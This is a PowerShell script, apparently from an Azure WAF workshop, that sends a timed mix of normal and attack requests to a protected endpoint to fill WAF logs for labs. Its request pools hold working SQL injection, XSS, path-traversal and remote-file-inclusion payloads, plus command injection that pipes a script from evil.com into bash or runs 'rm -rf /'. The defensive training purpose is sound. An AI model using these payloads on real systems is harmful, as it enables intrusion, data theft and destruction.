<#
.SYNOPSIS
    Generates sustained, realistic WAF traffic for populating Log Analytics.

.DESCRIPTION
    Runs for a configurable duration, sending a realistic mix of legitimate 
    traffic (~70%) and attack traffic (~30%) to WAF-protected endpoints.
    Designed to be run BEFORE lab sessions to pre-populate WAF logs.
    
    Traffic includes varied:
    - Attack types (SQLi, XSS, CMDi, path traversal, bots, scanners)
    - Legitimate browsing patterns (pages, search, API calls)
    - User-Agent strings (browsers, mobile, bots)
    - X-Forwarded-For headers (simulating different source IPs)
    - Request methods (GET, POST, HEAD)
    - URI paths and query parameters

.PARAMETER TargetUrl
    The WAF-protected endpoint URL (AppGW or Front Door).

.PARAMETER DurationMinutes
    How long to generate traffic (default: 15 minutes).

.PARAMETER RequestsPerSecond
    Approximate requests per second (default: 3).

.PARAMETER AttackRatio
    Percentage of requests that are attacks (default: 30).

.EXAMPLE
    # Generate 15 minutes of traffic against Application Gateway
    .\simulate-waf-traffic.ps1 -TargetUrl "http://waf-workshop-appgw-xxx.eastus2.cloudapp.azure.com"

    # Generate 30 minutes against Front Door with higher attack ratio
    .\simulate-waf-traffic.ps1 -TargetUrl "https://waf-workshop-endpoint.azurefd.net" -DurationMinutes 30 -AttackRatio 40

    # Quick 5-minute burst for testing
    .\simulate-waf-traffic.ps1 -TargetUrl "http://myappgw.com" -DurationMinutes 5 -RequestsPerSecond 5
#>

param(
    [Parameter(Mandatory = $true)]
    [string]$TargetUrl,

    [int]$DurationMinutes = 15,

    [int]$RequestsPerSecond = 3,

    [ValidateRange(0, 100)]
    [int]$AttackRatio = 30
)

$ErrorActionPreference = "SilentlyContinue"
$TargetUrl = $TargetUrl.TrimEnd('/')

# ============================================================
# Traffic Pools
# ============================================================

# Simulated source IPs (for X-Forwarded-For)
$sourceIPs = @(
    "203.0.113.10", "203.0.113.25", "203.0.113.50",   # "Attacker" IPs
    "198.51.100.1", "198.51.100.15", "198.51.100.30",  # "Attacker" IPs
    "192.0.2.100", "192.0.2.110", "192.0.2.120",       # "Legitimate" IPs
    "192.0.2.130", "192.0.2.140", "192.0.2.150",       # "Legitimate" IPs
    "10.0.5.10", "10.0.5.20", "10.0.5.30",             # "Internal" IPs
    "172.16.0.50", "172.16.0.60",                       # "Internal" IPs
    "45.33.32.156", "104.16.100.29", "151.101.1.140"    # Misc
)

# Legitimate User-Agents
$legitimateUAs = @(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.91"
)

# Bot/Scanner User-Agents  
$botUAs = @(
    "python-requests/2.31.0"
    "curl/8.4.0"
    "Scrapy/2.11.0 (+https://scrapy.org)"
    "Go-http-client/2.0"
    ""
    "Wget/1.21"
    "Java/17.0.1"
    "libwww-perl/6.67"
)

$scannerUAs = @(
    "Nikto/2.5.0"
    "sqlmap/1.7.11#stable (https://sqlmap.org)"
    "Nessus SOAP"
    "DirBuster-1.0-RC1 (http://www.owasp.org/)"
    "Acunetix-Product (https://www.acunetix.com/)"
    "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
)

$fakeGoodBotUAs = @(
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
)

# ============================================================
# Legitimate Traffic Patterns
# ============================================================

$legitimateRequests = @(
    @{ Method = "GET"; Path = "/"; Desc = "Homepage" }
    @{ Method = "GET"; Path = "/index.html"; Desc = "Index" }
    @{ Method = "GET"; Path = "/?page=about"; Desc = "About page" }
    @{ Method = "GET"; Path = "/?page=contact"; Desc = "Contact page" }
    @{ Method = "GET"; Path = "/?page=services"; Desc = "Services page" }
    @{ Method = "GET"; Path = "/?search=azure+web+application+firewall"; Desc = "Search query" }
    @{ Method = "GET"; Path = "/?search=cloud+security+best+practices"; Desc = "Search query 2" }
    @{ Method = "GET"; Path = "/?category=networking&sort=date"; Desc = "Category browse" }
    @{ Method = "GET"; Path = "/?id=42&format=json"; Desc = "API-style request" }
    @{ Method = "GET"; Path = "/?lang=en&region=us"; Desc = "Localization params" }
    @{ Method = "GET"; Path = "/?page=1&limit=20"; Desc = "Pagination" }
    @{ Method = "GET"; Path = "/api/health"; Desc = "Health check" }
    @{ Method = "GET"; Path = "/api/status"; Desc = "Status check" }
    @{ Method = "HEAD"; Path = "/"; Desc = "HEAD request" }
    @{ Method = "GET"; Path = "/favicon.ico"; Desc = "Favicon" }
    @{ Method = "GET"; Path = "/robots.txt"; Desc = "Robots.txt" }
    @{ Method = "GET"; Path = "/sitemap.xml"; Desc = "Sitemap" }
    @{ Method = "POST"; Path = "/api/feedback"; Body = "name=John+Doe&message=Great+workshop&rating=5"; Desc = "Form POST" }
    @{ Method = "POST"; Path = "/api/login"; Body = "username=admin&password=Welcome123"; Desc = "Login POST" }
    @{ Method = "POST"; Path = "/api/search"; Body = "q=azure+waf&page=1"; Desc = "Search POST" }
)

# ============================================================
# Attack Traffic Patterns
# ============================================================

$sqlInjectionRequests = @(
    @{ Method = "GET"; Path = "/?id=1 OR 1=1"; Desc = "SQLi: OR 1=1" }
    @{ Method = "GET"; Path = "/?id=1; DROP TABLE users--"; Desc = "SQLi: DROP TABLE" }
    @{ Method = "GET"; Path = "/?search=admin' UNION SELECT username,password FROM users--"; Desc = "SQLi: UNION SELECT" }
    @{ Method = "GET"; Path = "/?id=1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))"; Desc = "SQLi: CONVERT" }
    @{ Method = "GET"; Path = "/?q=1'; WAITFOR DELAY '0:0:5'--"; Desc = "SQLi: Time-based blind" }
    @{ Method = "GET"; Path = "/?user=admin'/*"; Desc = "SQLi: Comment" }
    @{ Method = "GET"; Path = "/?id=1 HAVING 1=1"; Desc = "SQLi: HAVING" }
    @{ Method = "GET"; Path = "/?name='; EXEC xp_cmdshell('whoami')--"; Desc = "SQLi: xp_cmdshell" }
    @{ Method = "POST"; Path = "/api/login"; Body = "username=admin'--&password=x"; Desc = "SQLi: Login bypass" }
    @{ Method = "POST"; Path = "/api/search"; Body = "q=' OR ''='"; Desc = "SQLi: OR in POST" }
    @{ Method = "GET"; Path = "/?id=1%20OR%201%3D1"; Desc = "SQLi: URL-encoded OR" }
    @{ Method = "GET"; Path = "/?order=id)%3BSELECT+SLEEP(5)%23"; Desc = "SQLi: ORDER BY injection" }
)

$xssRequests = @(
    @{ Method = "GET"; Path = "/?q=<script>alert('XSS')</script>"; Desc = "XSS: Script tag" }
    @{ Method = "GET"; Path = "/?q=<img src=x onerror=alert(1)>"; Desc = "XSS: IMG onerror" }
    @{ Method = "GET"; Path = "/?q=<svg/onload=alert('xss')>"; Desc = "XSS: SVG onload" }
    @{ Method = "GET"; Path = "/?q=javascript:alert(1)"; Desc = "XSS: javascript:" }
    @{ Method = "GET"; Path = "/?q=<body onload=alert(1)>"; Desc = "XSS: Body onload" }
    @{ Method = "GET"; Path = "/?name=<iframe src='javascript:alert(1)'>"; Desc = "XSS: Iframe" }
    @{ Method = "GET"; Path = "/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"; Desc = "XSS: URL-encoded" }
    @{ Method = "POST"; Path = "/api/feedback"; Body = "name=<script>document.cookie</script>&message=test"; Desc = "XSS: POST body" }
    @{ Method = "GET"; Path = "/?redirect=javascript:alert(document.domain)"; Desc = "XSS: Redirect" }
    @{ Method = "GET"; Path = "/?q=<marquee onstart=alert(1)>"; Desc = "XSS: Marquee" }
)

$cmdInjectionRequests = @(
    @{ Method = "GET"; Path = "/?cmd=;cat /etc/passwd"; Desc = "CMDi: cat passwd" }
    @{ Method = "GET"; Path = "/?cmd=|ls -la /"; Desc = "CMDi: pipe ls" }
    @{ Method = "GET"; Path = "/?file=;whoami"; Desc = "CMDi: whoami" }
    @{ Method = "GET"; Path = "/?input=;ping -c 10 127.0.0.1"; Desc = "CMDi: ping" }
    @{ Method = "GET"; Path = "/?cmd=`$(cat /etc/shadow)`"; Desc = "CMDi: subshell" }
    @{ Method = "GET"; Path = "/?host=;curl http://evil.com/shell.sh|bash"; Desc = "CMDi: reverse shell" }
    @{ Method = "GET"; Path = "/?dir=;rm -rf /"; Desc = "CMDi: rm -rf" }
    @{ Method = "POST"; Path = "/api/exec"; Body = "command=id%3Bcat+%2Fetc%2Fpasswd"; Desc = "CMDi: POST exec" }
)

$pathTraversalRequests = @(
    @{ Method = "GET"; Path = "/?file=../../etc/passwd"; Desc = "PathTrav: etc/passwd" }
    @{ Method = "GET"; Path = "/?file=..\..\windows\system32\drivers\etc\hosts"; Desc = "PathTrav: hosts" }
    @{ Method = "GET"; Path = "/?page=....//....//etc/passwd"; Desc = "PathTrav: double dot" }
    @{ Method = "GET"; Path = "/?doc=%2e%2e%2f%2e%2e%2fetc%2fpasswd"; Desc = "PathTrav: encoded" }
    @{ Method = "GET"; Path = "/?file=/etc/shadow"; Desc = "PathTrav: shadow" }
    @{ Method = "GET"; Path = "/?template=..%5c..%5c..%5cwindows%5cwin.ini"; Desc = "PathTrav: win.ini" }
    @{ Method = "GET"; Path = "/?include=....\/....\/etc/passwd"; Desc = "PathTrav: mixed" }
)

$rfiRequests = @(
    @{ Method = "GET"; Path = "/?page=http://evil.com/shell.php"; Desc = "RFI: Remote PHP" }
    @{ Method = "GET"; Path = "/?template=https://attacker.com/malware.js"; Desc = "RFI: Remote JS" }
    @{ Method = "GET"; Path = "/?url=ftp://evil.com/payload"; Desc = "RFI: FTP scheme" }
    @{ Method = "GET"; Path = "/?config=http://10.0.0.1/internal.conf"; Desc = "RFI: Internal" }
)

$scannerRequests = @(
    @{ Method = "GET"; Path = "/admin"; Desc = "Scan: Admin page" }
    @{ Method = "GET"; Path = "/wp-login.php"; Desc = "Scan: WP login" }
    @{ Method = "GET"; Path = "/wp-admin/"; Desc = "Scan: WP admin" }
    @{ Method = "GET"; Path = "/.env"; Desc = "Scan: .env file" }
    @{ Method = "GET"; Path = "/phpinfo.php"; Desc = "Scan: phpinfo" }
    @{ Method = "GET"; Path = "/.git/config"; Desc = "Scan: git config" }
    @{ Method = "GET"; Path = "/server-status"; Desc = "Scan: server-status" }
    @{ Method = "GET"; Path = "/actuator/env"; Desc = "Scan: Spring actuator" }
    @{ Method = "GET"; Path = "/web.config"; Desc = "Scan: web.config" }
    @{ Method = "GET"; Path = "/backup.sql"; Desc = "Scan: SQL backup" }
    @{ Method = "GET"; Path = "/database.sql.gz"; Desc = "Scan: DB dump" }
    @{ Method = "GET"; Path = "/api/v1/debug"; Desc = "Scan: Debug endpoint" }
    @{ Method = "GET"; Path = "/console"; Desc = "Scan: Console" }
    @{ Method = "GET"; Path = "/elmah.axd"; Desc = "Scan: ELMAH" }
    @{ Method = "GET"; Path = "/trace.axd"; Desc = "Scan: Trace" }
)

$protocolViolations = @(
    @{ Method = "GET"; Path = "/"; Desc = "Protocol: Empty UA"; UA = "" }
    @{ Method = "GET"; Path = "/"; Desc = "Protocol: Missing Accept"; Headers = @{ "Accept" = "" } }
)

# Combine all attack pools with weights
$attackPools = @(
    @{ Requests = $sqlInjectionRequests; Weight = 25; Name = "SQLi" }
    @{ Requests = $xssRequests; Weight = 25; Name = "XSS" }
    @{ Requests = $cmdInjectionRequests; Weight = 10; Name = "CMDi" }
    @{ Requests = $pathTraversalRequests; Weight = 10; Name = "PathTraversal" }
    @{ Requests = $rfiRequests; Weight = 5; Name = "RFI" }
    @{ Requests = $scannerRequests; Weight = 15; Name = "Scanner" }
    @{ Requests = $protocolViolations; Weight = 5; Name = "ProtocolViolation" }
)

# ============================================================
# Helper Functions
# ============================================================

function Get-RandomItem {
    param([array]$Items)
    $Items[(Get-Random -Maximum $Items.Count)]
}

function Get-WeightedAttackPool {
    $roll = Get-Random -Maximum 100
    $cumulative = 0
    foreach ($pool in $attackPools) {
        $cumulative += $pool.Weight
        if ($roll -lt $cumulative) {
            return $pool
        }
    }
    return $attackPools[0]
}

function Send-SimulatedRequest {
    param(
        [hashtable]$RequestDef,
        [string]$UserAgent,
        [string]$SourceIP,
        [bool]$IsAttack
    )
    
    $url = "$TargetUrl$($RequestDef.Path)"
    $headers = @{
        "X-Forwarded-For" = $SourceIP
    }
    if ($RequestDef.Headers) {
        foreach ($k in $RequestDef.Headers.Keys) {
            $headers[$k] = $RequestDef.Headers[$k]
        }
    }

    $params = @{
        Uri             = $url
        Method          = if ($RequestDef.Method) { $RequestDef.Method } else { "GET" }
        UseBasicParsing = $true
        TimeoutSec      = 10
        Headers         = $headers
        ErrorAction     = 'SilentlyContinue'
    }
    
    # Set User-Agent
    if ($RequestDef.UA -ne $null) {
        $params.Headers["User-Agent"] = $RequestDef.UA
    } elseif ($UserAgent) {
        $params.Headers["User-Agent"] = $UserAgent
    }
    
    if ($RequestDef.Body) {
        $params['Body'] = $RequestDef.Body
        $params['ContentType'] = 'application/x-www-form-urlencoded'
    }

    try {
        $response = Invoke-WebRequest @params
        return $response.StatusCode
    } catch {
        $code = $_.Exception.Response.StatusCode.value__
        if ($code) { return $code }
        return "Err"
    }
}

# ============================================================
# Main Execution Loop
# ============================================================

$startTime = Get-Date
$endTime = $startTime.AddMinutes($DurationMinutes)
$delayMs = [math]::Max(50, [int](1000 / $RequestsPerSecond))

# Stats
$stats = @{
    Total = 0
    Legitimate = 0
    Attack = 0
    Status200 = 0
    Status403 = 0
    Status429 = 0
    StatusOther = 0
    AttackTypes = @{}
}

Write-Host ""
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║         Azure WAF Traffic Simulator                        ║" -ForegroundColor Cyan
Write-Host "╠══════════════════════════════════════════════════════════════╣" -ForegroundColor Cyan
Write-Host "║  Target:      $($TargetUrl.PadRight(45))║" -ForegroundColor White
Write-Host "║  Duration:    $("$DurationMinutes minutes".PadRight(45))║" -ForegroundColor White
Write-Host "║  Rate:        ~$RequestsPerSecond req/sec$(" " * (39 - "$RequestsPerSecond req/sec".Length))║" -ForegroundColor White
Write-Host "║  Attack Mix:  ${AttackRatio}% attacks / $($100 - $AttackRatio)% legitimate$(" " * (30 - "${AttackRatio}% attacks / $($100 - $AttackRatio)% legitimate".Length))║" -ForegroundColor White
Write-Host "║  Est. Total:  ~$($DurationMinutes * 60 * $RequestsPerSecond) requests$(" " * (37 - "$($DurationMinutes * 60 * $RequestsPerSecond) requests".Length))║" -ForegroundColor White
Write-Host "╠══════════════════════════════════════════════════════════════╣" -ForegroundColor Cyan
Write-Host "║  Started at:  $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')                          ║" -ForegroundColor Gray
Write-Host "║  Ends at:     $($endTime.ToString('yyyy-MM-dd HH:mm:ss'))                          ║" -ForegroundColor Gray
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Write-Host "  Press Ctrl+C to stop early." -ForegroundColor Gray
Write-Host ""

$lastProgressTime = $startTime
$progressInterval = 30  # Print progress every 30 seconds

try {
    while ((Get-Date) -lt $endTime) {
        # Decide: legitimate or attack?
        $roll = Get-Random -Maximum 100
        $isAttack = ($roll -lt $AttackRatio)
        
        if ($isAttack) {
            # Pick attack pool based on weight
            $pool = Get-WeightedAttackPool
            $request = Get-RandomItem -Items $pool.Requests
            
            # Pick appropriate UA for attack type
            $uaPool = switch ($pool.Name) {
                "Scanner" { $scannerUAs }
                default {
                    # 50% bot UA, 30% scanner UA, 20% fake good bot
                    $uaRoll = Get-Random -Maximum 100
                    if ($uaRoll -lt 50) { $botUAs }
                    elseif ($uaRoll -lt 80) { $scannerUAs }
                    else { $fakeGoodBotUAs }
                }
            }
            $ua = Get-RandomItem -Items $uaPool
            
            # Attackers tend to come from fewer IPs
            $srcIP = Get-RandomItem -Items $sourceIPs[0..5]
            
            $status = Send-SimulatedRequest -RequestDef $request -UserAgent $ua -SourceIP $srcIP -IsAttack $true
            $stats.Attack++
            
            # Track attack types
            if (-not $stats.AttackTypes.ContainsKey($pool.Name)) {
                $stats.AttackTypes[$pool.Name] = 0
            }
            $stats.AttackTypes[$pool.Name]++
        } else {
            # Legitimate request
            $request = Get-RandomItem -Items $legitimateRequests
            $ua = Get-RandomItem -Items $legitimateUAs
            $srcIP = Get-RandomItem -Items $sourceIPs[6..($sourceIPs.Count - 1)]
            
            $status = Send-SimulatedRequest -RequestDef $request -UserAgent $ua -SourceIP $srcIP -IsAttack $false
            $stats.Legitimate++
        }
        
        $stats.Total++
        switch ($status) {
            200 { $stats.Status200++ }
            403 { $stats.Status403++ }
            429 { $stats.Status429++ }
            default { $stats.StatusOther++ }
        }
        
        # Progress update
        $now = Get-Date
        $elapsed = ($now - $startTime).TotalSeconds
        if (($now - $lastProgressTime).TotalSeconds -ge $progressInterval) {
            $remaining = [math]::Max(0, ($endTime - $now).TotalMinutes)
            $pct = [math]::Min(100, [math]::Round(($elapsed / ($DurationMinutes * 60)) * 100))
            $bar = ("█" * [math]::Floor($pct / 5)) + ("░" * (20 - [math]::Floor($pct / 5)))
            
            Write-Host "  [$bar] ${pct}% | $($stats.Total) requests | " -NoNewline -ForegroundColor White
            Write-Host "200:" -NoNewline -ForegroundColor Green
            Write-Host "$($stats.Status200) " -NoNewline -ForegroundColor Green
            Write-Host "403:" -NoNewline -ForegroundColor Red
            Write-Host "$($stats.Status403) " -NoNewline -ForegroundColor Red
            Write-Host "| $([math]::Round($remaining, 1)) min left" -ForegroundColor Gray
            
            $lastProgressTime = $now
        }
        
        # Add jitter to delay (±30%)
        $jitter = Get-Random -Minimum (-$delayMs * 0.3) -Maximum ($delayMs * 0.3)
        $actualDelay = [math]::Max(50, $delayMs + $jitter)
        Start-Sleep -Milliseconds $actualDelay
    }
} catch {
    Write-Host "`n  Stopped by user." -ForegroundColor Yellow
}

# ============================================================
# Final Summary
# ============================================================

$totalDuration = (Get-Date) - $startTime

Write-Host ""
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║                    Simulation Complete                      ║" -ForegroundColor Cyan
Write-Host "╠══════════════════════════════════════════════════════════════╣" -ForegroundColor Cyan
Write-Host "║  Duration:        $("$([math]::Round($totalDuration.TotalMinutes, 1)) minutes".PadRight(40))║" -ForegroundColor White
Write-Host "║  Total Requests:  $("$($stats.Total)".PadRight(40))║" -ForegroundColor White
Write-Host "║  Avg Rate:        $("$([math]::Round($stats.Total / $totalDuration.TotalSeconds, 1)) req/sec".PadRight(40))║" -ForegroundColor White
Write-Host "╠══════════════════════════════════════════════════════════════╣" -ForegroundColor Cyan
Write-Host "║  Traffic Breakdown:                                        ║" -ForegroundColor Yellow
Write-Host "║    Legitimate:    $("$($stats.Legitimate) ($([math]::Round($stats.Legitimate/$stats.Total*100))%)".PadRight(40))║" -ForegroundColor Green
Write-Host "║    Attacks:       $("$($stats.Attack) ($([math]::Round($stats.Attack/$stats.Total*100))%)".PadRight(40))║" -ForegroundColor Red
Write-Host "╠══════════════════════════════════════════════════════════════╣" -ForegroundColor Cyan
Write-Host "║  Response Codes:                                           ║" -ForegroundColor Yellow
Write-Host "║    200 OK:        $("$($stats.Status200)".PadRight(40))║" -ForegroundColor Green
Write-Host "║    403 Blocked:   $("$($stats.Status403)".PadRight(40))║" -ForegroundColor Red
Write-Host "║    429 RateLimit: $("$($stats.Status429)".PadRight(40))║" -ForegroundColor Yellow
Write-Host "║    Other:         $("$($stats.StatusOther)".PadRight(40))║" -ForegroundColor Gray
Write-Host "╠══════════════════════════════════════════════════════════════╣" -ForegroundColor Cyan
Write-Host "║  Attack Types:                                             ║" -ForegroundColor Yellow
foreach ($type in ($stats.AttackTypes.GetEnumerator() | Sort-Object Value -Descending)) {
    $line = "    $($type.Key):$(" " * (16 - $type.Key.Length))$($type.Value)"
    Write-Host "║  $($line.PadRight(57))║" -ForegroundColor Red
}
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Write-Host "  WAF logs will appear in Log Analytics in ~5-10 minutes." -ForegroundColor Yellow
Write-Host "  You can now proceed to the WAF analysis labs." -ForegroundColor Green
Write-Host ""
